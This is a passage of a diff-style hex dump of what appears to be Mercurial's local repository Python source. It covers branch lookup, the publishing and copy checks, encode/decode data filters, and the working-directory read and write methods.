+00012fc0: 2020 2020 2020 2073 656c 662e 5f72 6576         self._rev
+00012fd0: 6272 616e 6368 6361 6368 6520 3d20 6272  branchcache = br
+00012fe0: 616e 6368 6d61 702e 7265 7662 7261 6e63  anchmap.revbranc
+00012ff0: 6863 6163 6865 2873 656c 662e 756e 6669  hcache(self.unfi
+00013000: 6c74 6572 6564 2829 290a 2020 2020 2020  ltered()).      
+00013010: 2020 7265 7475 726e 2073 656c 662e 5f72    return self._r
+00013020: 6576 6272 616e 6368 6361 6368 650a 0a20  evbranchcache.. 
+00013030: 2020 2064 6566 2072 6567 6973 7465 725f     def register_
+00013040: 6368 616e 6765 7365 7428 7365 6c66 2c20  changeset(self, 
+00013050: 7265 762c 2063 6861 6e67 656c 6f67 7265  rev, changelogre
+00013060: 7669 7369 6f6e 293a 0a20 2020 2020 2020  vision):.       
+00013070: 2073 656c 662e 7265 7662 7261 6e63 6863   self.revbranchc
+00013080: 6163 6865 2829 2e73 6574 6461 7461 2872  ache().setdata(r
+00013090: 6576 2c20 6368 616e 6765 6c6f 6772 6576  ev, changelogrev
+000130a0: 6973 696f 6e29 0a0a 2020 2020 6465 6620  ision)..    def 
+000130b0: 6272 616e 6368 7469 7028 7365 6c66 2c20  branchtip(self, 
+000130c0: 6272 616e 6368 2c20 6967 6e6f 7265 6d69  branch, ignoremi
+000130d0: 7373 696e 673d 4661 6c73 6529 3a0a 2020  ssing=False):.  
+000130e0: 2020 2020 2020 2222 2272 6574 7572 6e20        """return 
+000130f0: 7468 6520 7469 7020 6e6f 6465 2066 6f72  the tip node for
+00013100: 2061 2067 6976 656e 2062 7261 6e63 680a   a given branch.
+00013110: 0a20 2020 2020 2020 2049 6620 6967 6e6f  .        If igno
+00013120: 7265 6d69 7373 696e 6720 6973 2054 7275  remissing is Tru
+00013130: 652c 2074 6865 6e20 7468 6973 206d 6574  e, then this met
+00013140: 686f 6420 7769 6c6c 206e 6f74 2072 6169  hod will not rai
+00013150: 7365 2061 6e20 6572 726f 722e 0a20 2020  se an error..   
+00013160: 2020 2020 2054 6869 7320 6973 2068 656c       This is hel
+00013170: 7066 756c 2066 6f72 2063 616c 6c65 7273  pful for callers
+00013180: 2074 6861 7420 6f6e 6c79 2065 7870 6563   that only expec
+00013190: 7420 4e6f 6e65 2066 6f72 2061 206d 6973  t None for a mis
+000131a0: 7369 6e67 2062 7261 6e63 680a 2020 2020  sing branch.    
+000131b0: 2020 2020 2865 2e67 2e20 6e61 6d65 7370      (e.g. namesp
+000131c0: 6163 6529 2e0a 0a20 2020 2020 2020 2022  ace)...        "
+000131d0: 2222 0a20 2020 2020 2020 2074 7279 3a0a  "".        try:.
+000131e0: 2020 2020 2020 2020 2020 2020 7265 7475              retu
+000131f0: 726e 2073 656c 662e 6272 616e 6368 6d61  rn self.branchma
+00013200: 7028 292e 6272 616e 6368 7469 7028 6272  p().branchtip(br
+00013210: 616e 6368 290a 2020 2020 2020 2020 6578  anch).        ex
+00013220: 6365 7074 204b 6579 4572 726f 723a 0a20  cept KeyError:. 
+00013230: 2020 2020 2020 2020 2020 2069 6620 6e6f             if no
+00013240: 7420 6967 6e6f 7265 6d69 7373 696e 673a  t ignoremissing:
+00013250: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00013260: 2072 6169 7365 2065 7272 6f72 2e52 6570   raise error.Rep
+00013270: 6f4c 6f6f 6b75 7045 7272 6f72 285f 2862  oLookupError(_(b
+00013280: 2275 6e6b 6e6f 776e 2062 7261 6e63 6820  "unknown branch 
+00013290: 2725 7327 2229 2025 2062 7261 6e63 6829  '%s'") % branch)
+000132a0: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
+000132b0: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
+000132c0: 2020 2070 6173 730a 0a20 2020 2064 6566     pass..    def
+000132d0: 206c 6f6f 6b75 7028 7365 6c66 2c20 6b65   lookup(self, ke
+000132e0: 7929 3a0a 2020 2020 2020 2020 6e6f 6465  y):.        node
+000132f0: 203d 2073 636d 7574 696c 2e72 6576 7379   = scmutil.revsy
+00013300: 6d62 6f6c 2873 656c 662c 206b 6579 292e  mbol(self, key).
+00013310: 6e6f 6465 2829 0a20 2020 2020 2020 2069  node().        i
+00013320: 6620 6e6f 6465 2069 7320 4e6f 6e65 3a0a  f node is None:.
+00013330: 2020 2020 2020 2020 2020 2020 7261 6973              rais
+00013340: 6520 6572 726f 722e 5265 706f 4c6f 6f6b  e error.RepoLook
+00013350: 7570 4572 726f 7228 5f28 6222 756e 6b6e  upError(_(b"unkn
+00013360: 6f77 6e20 7265 7669 7369 6f6e 2027 2573  own revision '%s
+00013370: 2722 2920 2520 6b65 7929 0a20 2020 2020  '") % key).     
+00013380: 2020 2072 6574 7572 6e20 6e6f 6465 0a0a     return node..
+00013390: 2020 2020 6465 6620 6c6f 6f6b 7570 6272      def lookupbr
+000133a0: 616e 6368 2873 656c 662c 206b 6579 293a  anch(self, key):
+000133b0: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
+000133c0: 2e62 7261 6e63 686d 6170 2829 2e68 6173  .branchmap().has
+000133d0: 6272 616e 6368 286b 6579 293a 0a20 2020  branch(key):.   
+000133e0: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
+000133f0: 6b65 790a 0a20 2020 2020 2020 2072 6574  key..        ret
+00013400: 7572 6e20 7363 6d75 7469 6c2e 7265 7673  urn scmutil.revs
+00013410: 796d 626f 6c28 7365 6c66 2c20 6b65 7929  ymbol(self, key)
+00013420: 2e62 7261 6e63 6828 290a 0a20 2020 2064  .branch()..    d
+00013430: 6566 206b 6e6f 776e 2873 656c 662c 206e  ef known(self, n
+00013440: 6f64 6573 293a 0a20 2020 2020 2020 2063  odes):.        c
+00013450: 6c20 3d20 7365 6c66 2e63 6861 6e67 656c  l = self.changel
+00013460: 6f67 0a20 2020 2020 2020 2067 6574 5f72  og.        get_r
+00013470: 6576 203d 2063 6c2e 696e 6465 782e 6765  ev = cl.index.ge
+00013480: 745f 7265 760a 2020 2020 2020 2020 6669  t_rev.        fi
+00013490: 6c74 6572 6564 203d 2063 6c2e 6669 6c74  ltered = cl.filt
+000134a0: 6572 6564 7265 7673 0a20 2020 2020 2020  eredrevs.       
+000134b0: 2072 6573 756c 7420 3d20 5b5d 0a20 2020   result = [].   
+000134c0: 2020 2020 2066 6f72 206e 2069 6e20 6e6f       for n in no
+000134d0: 6465 733a 0a20 2020 2020 2020 2020 2020  des:.           
+000134e0: 2072 203d 2067 6574 5f72 6576 286e 290a   r = get_rev(n).
+000134f0: 2020 2020 2020 2020 2020 2020 7265 7370              resp
+00013500: 203d 206e 6f74 2028 7220 6973 204e 6f6e   = not (r is Non
+00013510: 6520 6f72 2072 2069 6e20 6669 6c74 6572  e or r in filter
+00013520: 6564 290a 2020 2020 2020 2020 2020 2020  ed).            
+00013530: 7265 7375 6c74 2e61 7070 656e 6428 7265  result.append(re
+00013540: 7370 290a 2020 2020 2020 2020 7265 7475  sp).        retu
+00013550: 726e 2072 6573 756c 740a 0a20 2020 2064  rn result..    d
+00013560: 6566 206c 6f63 616c 2873 656c 6629 3a0a  ef local(self):.
+00013570: 2020 2020 2020 2020 7265 7475 726e 2073          return s
+00013580: 656c 660a 0a20 2020 2064 6566 2070 7562  elf..    def pub
+00013590: 6c69 7368 696e 6728 7365 6c66 293a 0a20  lishing(self):. 
+000135a0: 2020 2020 2020 2023 2069 7427 7320 7361         # it's sa
+000135b0: 6665 2028 616e 6420 6465 7369 7261 626c  fe (and desirabl
+000135c0: 6529 2074 6f20 7472 7573 7420 7468 6520  e) to trust the 
+000135d0: 7075 626c 6973 6820 666c 6167 2075 6e63  publish flag unc
+000135e0: 6f6e 6469 7469 6f6e 616c 6c79 0a20 2020  onditionally.   
+000135f0: 2020 2020 2023 2073 6f20 7468 6174 2077       # so that w
+00013600: 6520 646f 6e27 7420 6669 6e61 6c69 7a65  e don't finalize
+00013610: 2063 6861 6e67 6573 2073 6861 7265 6420   changes shared 
+00013620: 6265 7477 6565 6e20 7573 6572 7320 7669  between users vi
+00013630: 6120 7373 6820 6f72 206e 6673 0a20 2020  a ssh or nfs.   
+00013640: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
+00013650: 2e75 692e 636f 6e66 6967 626f 6f6c 2862  .ui.configbool(b
+00013660: 2770 6861 7365 7327 2c20 6227 7075 626c  'phases', b'publ
+00013670: 6973 6827 2c20 756e 7472 7573 7465 643d  ish', untrusted=
+00013680: 5472 7565 290a 0a20 2020 2064 6566 2063  True)..    def c
+00013690: 616e 636f 7079 2873 656c 6629 3a0a 2020  ancopy(self):.  
+000136a0: 2020 2020 2020 2320 736f 2073 7461 7469        # so stati
+000136b0: 6368 7474 7072 6570 6f27 7320 6f76 6572  chttprepo's over
+000136c0: 7269 6465 206f 6620 6c6f 6361 6c28 2920  ride of local() 
+000136d0: 776f 726b 730a 2020 2020 2020 2020 6966  works.        if
+000136e0: 206e 6f74 2073 656c 662e 6c6f 6361 6c28   not self.local(
+000136f0: 293a 0a20 2020 2020 2020 2020 2020 2072  ):.            r
+00013700: 6574 7572 6e20 4661 6c73 650a 2020 2020  eturn False.    
+00013710: 2020 2020 6966 206e 6f74 2073 656c 662e      if not self.
+00013720: 7075 626c 6973 6869 6e67 2829 3a0a 2020  publishing():.  
+00013730: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00013740: 2054 7275 650a 2020 2020 2020 2020 2320   True.        # 
+00013750: 6966 2070 7562 6c69 7368 696e 6720 7765  if publishing we
+00013760: 2063 616e 2774 2063 6f70 7920 6966 2074   can't copy if t
+00013770: 6865 7265 2069 7320 6669 6c74 6572 6564  here is filtered
+00013780: 2063 6f6e 7465 6e74 0a20 2020 2020 2020   content.       
+00013790: 2072 6574 7572 6e20 6e6f 7420 7365 6c66   return not self
+000137a0: 2e66 696c 7465 7265 6428 6227 7669 7369  .filtered(b'visi
+000137b0: 626c 6527 292e 6368 616e 6765 6c6f 672e  ble').changelog.
+000137c0: 6669 6c74 6572 6564 7265 7673 0a0a 2020  filteredrevs..  
+000137d0: 2020 6465 6620 7368 6172 6564 2873 656c    def shared(sel
+000137e0: 6629 3a0a 2020 2020 2020 2020 2727 2774  f):.        '''t
+000137f0: 6865 2074 7970 6520 6f66 2073 6861 7265  he type of share
+00013800: 6420 7265 706f 7369 746f 7279 2028 4e6f  d repository (No
+00013810: 6e65 2069 6620 6e6f 7420 7368 6172 6564  ne if not shared
+00013820: 2927 2727 0a20 2020 2020 2020 2069 6620  )'''.        if 
+00013830: 7365 6c66 2e73 6861 7265 6470 6174 6820  self.sharedpath 
+00013840: 213d 2073 656c 662e 7061 7468 3a0a 2020  != self.path:.  
+00013850: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00013860: 2062 2773 746f 7265 270a 2020 2020 2020   b'store'.      
+00013870: 2020 7265 7475 726e 204e 6f6e 650a 0a20    return None.. 
+00013880: 2020 2064 6566 2077 6a6f 696e 2873 656c     def wjoin(sel
+00013890: 662c 2066 3a20 6279 7465 732c 202a 696e  f, f: bytes, *in
+000138a0: 7369 6465 663a 2062 7974 6573 2920 2d3e  sidef: bytes) ->
+000138b0: 2062 7974 6573 3a0a 2020 2020 2020 2020   bytes:.        
+000138c0: 7265 7475 726e 2073 656c 662e 7666 732e  return self.vfs.
+000138d0: 7265 6c6a 6f69 6e28 7365 6c66 2e72 6f6f  reljoin(self.roo
+000138e0: 742c 2066 2c20 2a69 6e73 6964 6566 290a  t, f, *insidef).
+000138f0: 0a20 2020 2064 6566 2073 6574 7061 7265  .    def setpare
+00013900: 6e74 7328 7365 6c66 2c20 7031 2c20 7032  nts(self, p1, p2
+00013910: 3d4e 6f6e 6529 3a0a 2020 2020 2020 2020  =None):.        
+00013920: 6966 2070 3220 6973 204e 6f6e 653a 0a20  if p2 is None:. 
+00013930: 2020 2020 2020 2020 2020 2070 3220 3d20             p2 = 
+00013940: 7365 6c66 2e6e 756c 6c69 640a 2020 2020  self.nullid.    
+00013950: 2020 2020 7365 6c66 5b4e 6f6e 655d 2e73      self[None].s
+00013960: 6574 7061 7265 6e74 7328 7031 2c20 7032  etparents(p1, p2
+00013970: 290a 2020 2020 2020 2020 7365 6c66 2e5f  ).        self._
+00013980: 7175 6963 6b5f 6163 6365 7373 5f63 6861  quick_access_cha
+00013990: 6e67 6569 645f 696e 7661 6c69 6461 7465  ngeid_invalidate
+000139a0: 2829 0a0a 2020 2020 6465 6620 6669 6c65  ()..    def file
+000139b0: 6374 7828 7365 6c66 2c20 7061 7468 3a20  ctx(self, path: 
+000139c0: 6279 7465 732c 2063 6861 6e67 6569 643d  bytes, changeid=
+000139d0: 4e6f 6e65 2c20 6669 6c65 6964 3d4e 6f6e  None, fileid=Non
+000139e0: 652c 2063 6861 6e67 6563 7478 3d4e 6f6e  e, changectx=Non
+000139f0: 6529 3a0a 2020 2020 2020 2020 2222 2263  e):.        """c
+00013a00: 6861 6e67 6569 6420 6d75 7374 2062 6520  hangeid must be 
+00013a10: 6120 6368 616e 6765 7365 7420 7265 7669  a changeset revi
+00013a20: 7369 6f6e 2c20 6966 2073 7065 6369 6669  sion, if specifi
+00013a30: 6564 2e0a 2020 2020 2020 2020 6669 6c65  ed..        file
+00013a40: 6964 2063 616e 2062 6520 6120 6669 6c65  id can be a file
+00013a50: 2072 6576 6973 696f 6e20 6f72 206e 6f64   revision or nod
+00013a60: 652e 2222 220a 2020 2020 2020 2020 7265  e.""".        re
+00013a70: 7475 726e 2063 6f6e 7465 7874 2e66 696c  turn context.fil
+00013a80: 6563 7478 280a 2020 2020 2020 2020 2020  ectx(.          
+00013a90: 2020 7365 6c66 2c20 7061 7468 2c20 6368    self, path, ch
+00013aa0: 616e 6765 6964 2c20 6669 6c65 6964 2c20  angeid, fileid, 
+00013ab0: 6368 616e 6765 6374 783d 6368 616e 6765  changectx=change
+00013ac0: 6374 780a 2020 2020 2020 2020 290a 0a20  ctx.        ).. 
+00013ad0: 2020 2064 6566 2067 6574 6377 6428 7365     def getcwd(se
+00013ae0: 6c66 2920 2d3e 2062 7974 6573 3a0a 2020  lf) -> bytes:.  
+00013af0: 2020 2020 2020 7265 7475 726e 2073 656c        return sel
+00013b00: 662e 6469 7273 7461 7465 2e67 6574 6377  f.dirstate.getcw
+00013b10: 6428 290a 0a20 2020 2064 6566 2070 6174  d()..    def pat
+00013b20: 6874 6f28 7365 6c66 2c20 663a 2062 7974  hto(self, f: byt
+00013b30: 6573 2c20 6377 643a 204f 7074 696f 6e61  es, cwd: Optiona
+00013b40: 6c5b 6279 7465 735d 203d 204e 6f6e 6529  l[bytes] = None)
+00013b50: 202d 3e20 6279 7465 733a 0a20 2020 2020   -> bytes:.     
+00013b60: 2020 2072 6574 7572 6e20 7365 6c66 2e64     return self.d
+00013b70: 6972 7374 6174 652e 7061 7468 746f 2866  irstate.pathto(f
+00013b80: 2c20 6377 6429 0a0a 2020 2020 6465 6620  , cwd)..    def 
+00013b90: 5f6c 6f61 6466 696c 7465 7228 7365 6c66  _loadfilter(self
+00013ba0: 2c20 6669 6c74 6572 293a 0a20 2020 2020  , filter):.     
+00013bb0: 2020 2069 6620 6669 6c74 6572 206e 6f74     if filter not
+00013bc0: 2069 6e20 7365 6c66 2e5f 6669 6c74 6572   in self._filter
+00013bd0: 7061 7473 3a0a 2020 2020 2020 2020 2020  pats:.          
+00013be0: 2020 6c20 3d20 5b5d 0a20 2020 2020 2020    l = [].       
+00013bf0: 2020 2020 2066 6f72 2070 6174 2c20 636d       for pat, cm
+00013c00: 6420 696e 2073 656c 662e 7569 2e63 6f6e  d in self.ui.con
+00013c10: 6669 6769 7465 6d73 2866 696c 7465 7229  figitems(filter)
+00013c20: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+00013c30: 2020 6966 2063 6d64 203d 3d20 6227 2127    if cmd == b'!'
+00013c40: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+00013c50: 2020 2020 2020 636f 6e74 696e 7565 0a20        continue. 
+00013c60: 2020 2020 2020 2020 2020 2020 2020 206d                 m
+00013c70: 6620 3d20 6d61 7463 686d 6f64 2e6d 6174  f = matchmod.mat
+00013c80: 6368 2873 656c 662e 726f 6f74 2c20 6227  ch(self.root, b'
+00013c90: 272c 205b 7061 745d 290a 2020 2020 2020  ', [pat]).      
+00013ca0: 2020 2020 2020 2020 2020 666e 203d 204e            fn = N
+00013cb0: 6f6e 650a 2020 2020 2020 2020 2020 2020  one.            
+00013cc0: 2020 2020 7061 7261 6d73 203d 2063 6d64      params = cmd
+00013cd0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00013ce0: 2066 6f72 206e 616d 652c 2066 696c 7465   for name, filte
+00013cf0: 7266 6e20 696e 2073 656c 662e 5f64 6174  rfn in self._dat
+00013d00: 6166 696c 7465 7273 2e69 7465 6d73 2829  afilters.items()
+00013d10: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+00013d20: 2020 2020 2020 6966 2063 6d64 2e73 7461        if cmd.sta
+00013d30: 7274 7377 6974 6828 6e61 6d65 293a 0a20  rtswith(name):. 
+00013d40: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00013d50: 2020 2020 2020 2066 6e20 3d20 6669 6c74         fn = filt
+00013d60: 6572 666e 0a20 2020 2020 2020 2020 2020  erfn.           
+00013d70: 2020 2020 2020 2020 2020 2020 2070 6172               par
+00013d80: 616d 7320 3d20 636d 645b 6c65 6e28 6e61  ams = cmd[len(na
+00013d90: 6d65 2920 3a5d 2e6c 7374 7269 7028 290a  me) :].lstrip().
+00013da0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00013db0: 2020 2020 2020 2020 6272 6561 6b0a 2020          break.  
+00013dc0: 2020 2020 2020 2020 2020 2020 2020 6966                if
+00013dd0: 206e 6f74 2066 6e3a 0a20 2020 2020 2020   not fn:.       
+00013de0: 2020 2020 2020 2020 2020 2020 2066 6e20               fn 
+00013df0: 3d20 6c61 6d62 6461 2073 2c20 632c 202a  = lambda s, c, *
+00013e00: 2a6b 7761 7267 733a 2070 726f 6375 7469  *kwargs: procuti
+00013e10: 6c2e 6669 6c74 6572 2873 2c20 6329 0a20  l.filter(s, c). 
+00013e20: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00013e30: 2020 2066 6e2e 5f5f 6e61 6d65 5f5f 203d     fn.__name__ =
+00013e40: 2027 636f 6d6d 616e 6466 696c 7465 7227   'commandfilter'
+00013e50: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00013e60: 2023 2057 7261 7020 6f6c 6420 6669 6c74   # Wrap old filt
+00013e70: 6572 7320 6e6f 7420 7375 7070 6f72 7469  ers not supporti
+00013e80: 6e67 206b 6579 776f 7264 2061 7267 756d  ng keyword argum
+00013e90: 656e 7473 0a20 2020 2020 2020 2020 2020  ents.           
+00013ea0: 2020 2020 2069 6620 6e6f 7420 7079 636f       if not pyco
+00013eb0: 6d70 6174 2e67 6574 6172 6773 7065 6328  mpat.getargspec(
+00013ec0: 666e 295b 325d 3a0a 2020 2020 2020 2020  fn)[2]:.        
+00013ed0: 2020 2020 2020 2020 2020 2020 6f6c 6466              oldf
+00013ee0: 6e20 3d20 666e 0a20 2020 2020 2020 2020  n = fn.         
+00013ef0: 2020 2020 2020 2020 2020 2066 6e20 3d20             fn = 
+00013f00: 6c61 6d62 6461 2073 2c20 632c 206f 6c64  lambda s, c, old
+00013f10: 666e 3d6f 6c64 666e 2c20 2a2a 6b77 6172  fn=oldfn, **kwar
+00013f20: 6773 3a20 6f6c 6466 6e28 732c 2063 290a  gs: oldfn(s, c).
+00013f30: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00013f40: 2020 2020 666e 2e5f 5f6e 616d 655f 5f20      fn.__name__ 
+00013f50: 3d20 2763 6f6d 7061 742d 2720 2b20 6f6c  = 'compat-' + ol
+00013f60: 6466 6e2e 5f5f 6e61 6d65 5f5f 0a20 2020  dfn.__name__.   
+00013f70: 2020 2020 2020 2020 2020 2020 206c 2e61               l.a
+00013f80: 7070 656e 6428 286d 662c 2066 6e2c 2070  ppend((mf, fn, p
+00013f90: 6172 616d 7329 290a 2020 2020 2020 2020  arams)).        
+00013fa0: 2020 2020 7365 6c66 2e5f 6669 6c74 6572      self._filter
+00013fb0: 7061 7473 5b66 696c 7465 725d 203d 206c  pats[filter] = l
+00013fc0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
+00013fd0: 7365 6c66 2e5f 6669 6c74 6572 7061 7473  self._filterpats
+00013fe0: 5b66 696c 7465 725d 0a0a 2020 2020 6465  [filter]..    de
+00013ff0: 6620 5f66 696c 7465 7228 7365 6c66 2c20  f _filter(self, 
+00014000: 6669 6c74 6572 7061 7473 2c20 6669 6c65  filterpats, file
+00014010: 6e61 6d65 2c20 6461 7461 293a 0a20 2020  name, data):.   
+00014020: 2020 2020 2066 6f72 206d 662c 2066 6e2c       for mf, fn,
+00014030: 2063 6d64 2069 6e20 6669 6c74 6572 7061   cmd in filterpa
+00014040: 7473 3a0a 2020 2020 2020 2020 2020 2020  ts:.            
+00014050: 6966 206d 6628 6669 6c65 6e61 6d65 293a  if mf(filename):
+00014060: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00014070: 2073 656c 662e 7569 2e64 6562 7567 280a   self.ui.debug(.
+00014080: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00014090: 2020 2020 6222 6669 6c74 6572 696e 6720      b"filtering 
+000140a0: 2573 2074 6872 6f75 6768 2025 735c 6e22  %s through %s\n"
+000140b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000140c0: 2020 2020 2025 2028 6669 6c65 6e61 6d65       % (filename
+000140d0: 2c20 636d 6420 6f72 2070 7963 6f6d 7061  , cmd or pycompa
+000140e0: 742e 7379 7362 7974 6573 2866 6e2e 5f5f  t.sysbytes(fn.__
+000140f0: 6e61 6d65 5f5f 2929 0a20 2020 2020 2020  name__)).       
+00014100: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
+00014110: 2020 2020 2020 2020 2020 2064 6174 6120             data 
+00014120: 3d20 666e 2864 6174 612c 2063 6d64 2c20  = fn(data, cmd, 
+00014130: 7569 3d73 656c 662e 7569 2c20 7265 706f  ui=self.ui, repo
+00014140: 3d73 656c 662c 2066 696c 656e 616d 653d  =self, filename=
+00014150: 6669 6c65 6e61 6d65 290a 2020 2020 2020  filename).      
+00014160: 2020 2020 2020 2020 2020 6272 6561 6b0a            break.
+00014170: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
+00014180: 6461 7461 0a0a 2020 2020 4075 6e66 696c  data..    @unfil
+00014190: 7465 7265 6470 726f 7065 7274 7963 6163  teredpropertycac
+000141a0: 6865 0a20 2020 2064 6566 205f 656e 636f  he.    def _enco
+000141b0: 6465 6669 6c74 6572 7061 7473 2873 656c  defilterpats(sel
+000141c0: 6629 3a0a 2020 2020 2020 2020 7265 7475  f):.        retu
+000141d0: 726e 2073 656c 662e 5f6c 6f61 6466 696c  rn self._loadfil
+000141e0: 7465 7228 6227 656e 636f 6465 2729 0a0a  ter(b'encode')..
+000141f0: 2020 2020 4075 6e66 696c 7465 7265 6470      @unfilteredp
+00014200: 726f 7065 7274 7963 6163 6865 0a20 2020  ropertycache.   
+00014210: 2064 6566 205f 6465 636f 6465 6669 6c74   def _decodefilt
+00014220: 6572 7061 7473 2873 656c 6629 3a0a 2020  erpats(self):.  
+00014230: 2020 2020 2020 7265 7475 726e 2073 656c        return sel
+00014240: 662e 5f6c 6f61 6466 696c 7465 7228 6227  f._loadfilter(b'
+00014250: 6465 636f 6465 2729 0a0a 2020 2020 6465  decode')..    de
+00014260: 6620 6164 6464 6174 6166 696c 7465 7228  f adddatafilter(
+00014270: 7365 6c66 2c20 6e61 6d65 2c20 6669 6c74  self, name, filt
+00014280: 6572 293a 0a20 2020 2020 2020 2073 656c  er):.        sel
+00014290: 662e 5f64 6174 6166 696c 7465 7273 5b6e  f._datafilters[n
+000142a0: 616d 655d 203d 2066 696c 7465 720a 0a20  ame] = filter.. 
+000142b0: 2020 2064 6566 2077 7265 6164 2873 656c     def wread(sel
+000142c0: 662c 2066 696c 656e 616d 653a 2062 7974  f, filename: byt
+000142d0: 6573 2920 2d3e 2062 7974 6573 3a0a 2020  es) -> bytes:.  
+000142e0: 2020 2020 2020 6966 2073 656c 662e 7776        if self.wv
+000142f0: 6673 2e69 736c 696e 6b28 6669 6c65 6e61  fs.islink(filena
+00014300: 6d65 293a 0a20 2020 2020 2020 2020 2020  me):.           
+00014310: 2064 6174 6120 3d20 7365 6c66 2e77 7666   data = self.wvf
+00014320: 732e 7265 6164 6c69 6e6b 2866 696c 656e  s.readlink(filen
+00014330: 616d 6529 0a20 2020 2020 2020 2065 6c73  ame).        els
+00014340: 653a 0a20 2020 2020 2020 2020 2020 2064  e:.            d
+00014350: 6174 6120 3d20 7365 6c66 2e77 7666 732e  ata = self.wvfs.
+00014360: 7265 6164 2866 696c 656e 616d 6529 0a20  read(filename). 
+00014370: 2020 2020 2020 2072 6574 7572 6e20 7365         return se
+00014380: 6c66 2e5f 6669 6c74 6572 2873 656c 662e  lf._filter(self.
+00014390: 5f65 6e63 6f64 6566 696c 7465 7270 6174  _encodefilterpat
+000143a0: 732c 2066 696c 656e 616d 652c 2064 6174  s, filename, dat
+000143b0: 6129 0a0a 2020 2020 6465 6620 7777 7269  a)..    def wwri
+000143c0: 7465 280a 2020 2020 2020 2020 7365 6c66  te(.        self
+000143d0: 2c0a 2020 2020 2020 2020 6669 6c65 6e61  ,.        filena
+000143e0: 6d65 3a20 6279 7465 732c 0a20 2020 2020  me: bytes,.     
+000143f0: 2020 2064 6174 613a 2062 7974 6573 2c0a     data: bytes,.
+00014400: 2020 2020 2020 2020 666c 6167 733a 2062          flags: b
+00014410: 7974 6573 2c0a 2020 2020 2020 2020 6261  ytes,.        ba
+00014420: 636b 6772 6f75 6e64 636c 6f73 653d 4661  ckgroundclose=Fa
+00014430: 6c73 652c 0a20 2020 2020 2020 202a 2a6b  lse,.        **k
+00014440: 7761 7267 730a 2020 2020 2920 2d3e 2069  wargs.    ) -> i
+00014450: 6e74 3a0a 2020 2020 2020 2020 2222 2277  nt:.        """w
+00014460: 7269 7465 2060 6064 6174 6160 6020 696e  rite ``data`` in
+00014470: 746f 2060 6066 696c 656e 616d 6560 6020  to ``filename`` 
+00014480: 696e 2074 6865 2077 6f72 6b69 6e67 2064  in the working d
+00014490: 6972 6563 746f 7279 0a0a 2020 2020 2020  irectory..      
+000144a0: 2020 5468 6973 2072 6574 7572 6e73 206c    This returns l
+000144b0: 656e 6774 6820 6f66 2077 7269 7474 656e  ength of written
+000144c0: 2028 6d61 7962 6520 6465 636f 6465 6429   (maybe decoded)
+000144d0: 2064 6174 612e 0a20 2020 2020 2020 2022   data..        "
+000144e0: 2222 0a20 2020 2020 2020 2064 6174 6120  "".        data 
+000144f0: 3d20 7365 6c66 2e5f 6669 6c74 6572 2873  = self._filter(s
+00014500: 656c 662e 5f64 6563 6f64 6566 696c 7465  elf._decodefilte
+00014510: 7270 6174 732c 2066 696c 656e 616d 652c  rpats, filename,
+00014520: 2064 6174 6129 0a20 2020 2020 2020 2069   data).        i
+00014530: 6620 6227 6c27 2069 6e20 666c 6167 733a  f b'l' in flags:
+00014540: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
+00014550: 662e 7776 6673 2e73 796d 6c69 6e6b 2864  f.wvfs.symlink(d
+00014560: 6174 612c 2066 696c 656e 616d 6529 0a20  ata, filename). 
+00014570: 2020 2020 2020 2065 6c73 653a 0a20 2020         else:.   
+00014580: 2020 2020 2020 2020 2073 656c 662e 7776           self.wv
+00014590: 6673 2e77 7269 7465 280a 2020 2020 2020  fs.write(.      
+000145a0: 2020 2020 2020 2020 2020 6669 6c65 6e61            filena
+000145b0: 6d65 2c20 6461 7461 2c20 6261 636b 6772  me, data, backgr
+000145c0: 6f75 6e64 636c 6f73 653d 6261 636b 6772  oundclose=backgr
+000145d0: 6f75 6e64 636c 6f73 652c 202a 2a6b 7761  oundclose, **kwa
+000145e0: 7267 730a 2020 2020 2020 2020 2020 2020  rgs.            
+000145f0: 290a 2020 2020 2020 2020 2020 2020 6966  ).            if
+00014600: 2062 2778 2720 696e 2066 6c61 6773 3a0a   b'x' in flags:.
+00014610: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00014620: 7365 6c66 2e77 7666 732e 7365 7466 6c61  self.wvfs.setfla
+00014630: 6773 2866 696c 656e 616d 652c 2046 616c  gs(filename, Fal
+00014640: 7365 2c20 5472 7565 290a 2020 2020 2020  se, True).      
+00014650: 2020 2020 2020 656c 7365 3a0a 2020 2020        else:.    
+00014660: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+00014670: 2e77 7666 732e 7365 7466 6c61 6773 2866  .wvfs.setflags(f
+00014680: 696c 656e 616d 652c 2046 616c 7365 2c20  ilename, False, 
+00014690: 4661 6c73 6529 0a20 2020 2020 2020 2072  False).        r
+000146a0: 6574 7572 6e20 6c65 6e28 6461 7461 290a  eturn len(data).
+000146b0: 0a20 2020 2064 6566 2077 7772 6974 6564  .    def wwrited
+000146c0: 6174 6128 7365 6c66 2c20 6669 6c65 6e61  ata(self, filena
+000146d0: 6d65 3a20 6279 7465 732c 2064 6174 613a  me: bytes, data:
+000146e0: 2062 7974 6573 2920 2d3e 2062 7974 6573   bytes) -> bytes
+000146f0: 3a0a 2020 2020 2020 2020 7265 7475 726e  :.        return
+00014700: 2073 656c 662e 5f66 696c 7465 7228 7365   self._filter(se
+00014710: 6c66 2e5f 6465 636f 6465 6669 6c74 6572  lf._decodefilter
